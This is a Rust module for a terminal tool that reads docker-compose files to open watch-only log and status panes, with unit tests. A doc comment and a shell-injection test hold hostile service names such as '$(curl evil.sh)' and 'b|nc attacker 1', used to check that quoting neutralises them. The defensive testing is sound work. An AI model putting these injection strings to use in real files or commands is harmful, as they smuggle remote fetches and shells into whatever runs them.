//! The war room: the window arranges itself around an operation.
//!
//! You do not describe windows, you declare an intention — "I am deploying this" —
//! and the panes that matter for it appear: the deploy itself, the logs of the
//! services about to change, and something watching whether they come back healthy.
//! When it is over, the room takes itself down.
//!
//! Nothing here asks the user anything. A project already says what it is made of:
//! `docker-compose.yml` lists the services, and the repository root says which
//! project this is. This module is the part that reads that — pure, so the reading
//! can be tested without a daemon, a network or a window.

use std::path::{Path, PathBuf};

/// What a war room will be built out of.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Plan {
    /// The compose file this was read from, which is also the working directory the
    /// panes should run in.
    pub file: PathBuf,
    /// Services, in the order the file lists them — which is usually the order the
    /// author thinks about them, and a better default than alphabetical.
    pub services: Vec<String>,
}

/// The names compose files are allowed to have, newest convention first.
const COMPOSE_NAMES: [&str; 4] =
    ["compose.yaml", "compose.yml", "docker-compose.yml", "docker-compose.yaml"];

/// Finds the compose file for a directory, walking up to the repository root.
///
/// Walking up matters: `cd services/api && deploy` is how people work, and the
/// compose file usually lives at the top.
pub fn find_compose(from: &Path, stop_at: Option<&Path>) -> Option<PathBuf> {
    let mut dir = Some(from);
    while let Some(d) = dir {
        for name in COMPOSE_NAMES {
            let candidate = d.join(name);
            if candidate.is_file() {
                return Some(candidate);
            }
        }
        if stop_at.is_some_and(|root| d == root) {
            return None;
        }
        dir = d.parent();
    }
    None
}

/// The service names in a compose file.
///
/// Hand-parsed rather than pulling in a YAML crate: what is needed is one level of
/// keys under `services:`, and a dependency that can parse anchors, merges and flow
/// mappings buys nothing here. The parse is deliberately conservative — anything it
/// is not sure about, it drops, because a war room that opens a pane for a service
/// that does not exist is worse than one that opens fewer panes.
pub fn services_in(yaml: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut in_services = false;
    let mut indent_of_service: Option<usize> = None;

    for raw in yaml.lines() {
        let line = raw.split('#').next().unwrap_or("");
        if line.trim().is_empty() {
            continue;
        }
        let indent = line.len() - line.trim_start().len();
        let trimmed = line.trim_end();

        if !in_services {
            // `services:` at the top level, not `x-services:` and not a nested key.
            if indent == 0 && trimmed.trim_end_matches(' ') == "services:" {
                in_services = true;
            }
            continue;
        }

        // A key back at column 0 ends the section (`volumes:`, `networks:`…).
        if indent == 0 {
            break;
        }
        // The first child sets what "one level in" means for this file, since compose
        // files are written with two spaces, four, or a tab.
        let depth = *indent_of_service.get_or_insert(indent);
        if indent != depth {
            continue; // deeper: a service's own settings, not a service name.
        }
        let Some(name) = trimmed.trim().strip_suffix(':') else { continue };
        let name = name.trim();
        // A service name is a name: no quotes to strip, no flow syntax, no list item.
        if name.is_empty()
            || name.starts_with('-')
            || name.contains(' ')
            || name.contains('{')
            || name.contains('"')
        {
            continue;
        }
        out.push(name.to_string());
    }
    out
}

/// Reads a plan from a compose file on disk.
pub fn plan_from(file: &Path) -> Option<Plan> {
    let text = std::fs::read_to_string(file).ok()?;
    let services = services_in(&text);
    (!services.is_empty()).then(|| Plan { file: file.to_path_buf(), services })
}

/// The commands a war room runs, in the order the panes should appear.
///
/// Every one of them only WATCHES. The deploy itself is staged at a prompt for the
/// user to fire: a window that arranges itself is a convenience, one that deploys by
/// itself is an accident waiting for a witness.
///
/// The directory and the service names are QUOTED. Both come out of a file the user
/// cloned rather than wrote, these lines are handed to `sh -c`, and a room opens
/// without anybody confirming anything: a service key spelled `x;curl evil|sh` would
/// otherwise be a repository that runs code by being opened. Quoting is also what
/// keeps a project path with a space in it from breaking every pane.
pub fn watch_commands(plan: &Plan, max_services: usize) -> Vec<(String, String)> {
    let dir = crate::shell_quote(&plan.file.parent().unwrap_or(Path::new(".")).to_string_lossy());
    let mut out = vec![(
        "status".to_string(),
        format!("cd {dir} && watch -n 2 docker compose ps"),
    )];
    for svc in plan.services.iter().take(max_services) {
        let quoted = crate::shell_quote(svc);
        out.push((svc.clone(), format!("cd {dir} && docker compose logs -f --tail 40 {quoted}")));
    }
    out
}

/// What taking a room down means for the tab it lives in.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Teardown {
    /// Nothing here is an untouched room pane; leave the tab alone.
    Nothing,
    /// Close those panes; the rest of the tab is somebody's work.
    Panes,
    /// Every pane is the room's, so the TAB is what goes.
    WholeTab,
}

/// Decides which of the three it is.
///
/// The last case is the one that needs saying: a tab cannot be emptied — closing its
/// final pane is refused, because a tab with no pane is not a thing — so a room
/// nobody typed in cannot be taken apart pane by pane. One would always survive,
/// still polling docker every two seconds, in a tab nobody asked for, while the
/// message claimed the room was closed.
pub fn teardown(panes_in_tab: usize, untouched_room_panes: usize) -> Teardown {
    if untouched_room_panes == 0 {
        Teardown::Nothing
    } else if untouched_room_panes >= panes_in_tab {
        Teardown::WholeTab
    } else {
        Teardown::Panes
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const COMPOSE: &str = r#"
# a comment
version: "3.9"

services:
  api:
    image: ghcr.io/acme/api:1.2
    ports:
      - "8080:8080"
  worker:
    build: ./worker
    environment:
      QUEUE: default
  db:
    image: postgres:16

volumes:
  pgdata:
"#;

    /// The services, in file order — which is the order the author thinks in, and a
    /// better default than alphabetical.
    #[test]
    fn services_come_out_in_the_order_the_file_lists_them() {
        assert_eq!(services_in(COMPOSE), vec!["api", "worker", "db"]);
    }

    /// Everything below a service is its settings, and everything after the section
    /// is another section. Both are easy to swallow by accident, and a pane opened
    /// for `ports` or `pgdata` is a war room that lies about the project.
    #[test]
    fn settings_and_later_sections_are_not_services() {
        let names = services_in(COMPOSE);
        for wrong in ["image", "ports", "build", "environment", "volumes", "pgdata", "version"] {
            assert!(!names.contains(&wrong.to_string()), "{wrong} was read as a service");
        }
    }

    /// Four-space and tab files are as common as two-space ones; the indent is
    /// learned from the first child rather than assumed.
    #[test]
    fn the_indent_is_learned_not_assumed() {
        let four = "services:\n    api:\n        image: x\n    web:\n        image: y\n";
        assert_eq!(services_in(four), vec!["api", "web"]);
    }

    /// `x-services:` is an extension field, not the section. Matching by suffix would
    /// take it.
    #[test]
    fn an_extension_field_is_not_the_services_section() {
        let y = "x-services:\n  ghost:\n    image: x\n";
        assert!(services_in(y).is_empty());
    }

    /// A file with nothing recognisable yields no plan at all, rather than a war room
    /// with zero panes and no explanation.
    #[test]
    fn a_file_without_services_is_not_a_plan() {
        assert!(services_in("version: \"3\"\nvolumes:\n  data:\n").is_empty());
    }

    /// Every command a war room opens only watches. The deploy is staged for the
    /// user, never run by the window.
    #[test]
    fn every_opened_pane_only_watches() {
        let plan = Plan {
            file: PathBuf::from("/srv/app/compose.yaml"),
            services: vec!["api".into(), "worker".into(), "db".into()],
        };
        let cmds = watch_commands(&plan, 2);
        assert_eq!(cmds.len(), 3, "status + two services (the cap)");
        assert!(cmds[0].1.contains("docker compose ps"));
        for (_, cmd) in &cmds {
            assert!(cmd.contains("/srv/app"), "runs where the project is: {cmd}");
            for danger in ["up -d", "down", "restart", "pull", "deploy"] {
                assert!(!cmd.contains(danger), "{cmd} does more than watch");
            }
        }
    }

    /// A room nobody typed in leaves nothing behind. Closing its panes one by one
    /// cannot do that — the last one in a tab is not closeable — so a pane would
    /// survive its own room, still polling docker every two seconds.
    #[test]
    fn a_room_nobody_typed_in_leaves_no_pane_behind() {
        assert_eq!(teardown(5, 5), Teardown::WholeTab, "all five are the room's");
        assert_eq!(teardown(1, 1), Teardown::WholeTab, "a one-pane room is still a room");
        // Somebody worked in two of them: those two, and the tab, stay.
        assert_eq!(teardown(5, 3), Teardown::Panes);
        assert_eq!(teardown(5, 0), Teardown::Nothing, "nothing here belongs to a room");
    }

    /// A compose file is text somebody else wrote, and opening a war room asks the
    /// user nothing. Nothing read out of it may reach `sh -c` as syntax — a service
    /// key spelled like a command must stay a word, and a path with a space in it
    /// must stay one path.
    #[test]
    fn nothing_read_from_the_file_reaches_the_shell_as_syntax() {
        let plan = Plan {
            file: PathBuf::from("/srv/my project/compose.yaml"),
            services: vec![
                "api".into(),
                "x;touch /tmp/pwned".into(),
                "$(curl evil.sh)".into(),
                "a`id`b".into(),
                "b|nc attacker 1".into(),
            ],
        };
        for (_, cmd) in watch_commands(&plan, 9) {
            // Everything the shell would act on has to sit INSIDE the quotes; what is
            // left outside them is only this module's own template.
            let outside: String = cmd.split('\'').step_by(2).collect();
            for c in [';', '$', '|', '(', ')', '`', '\n', '>', '<'] {
                assert!(!outside.contains(c), "{c:?} escaped the quotes in {cmd:?}");
            }
            assert!(cmd.contains("'/srv/my project'"), "the path stays one word: {cmd}");
        }
    }
}
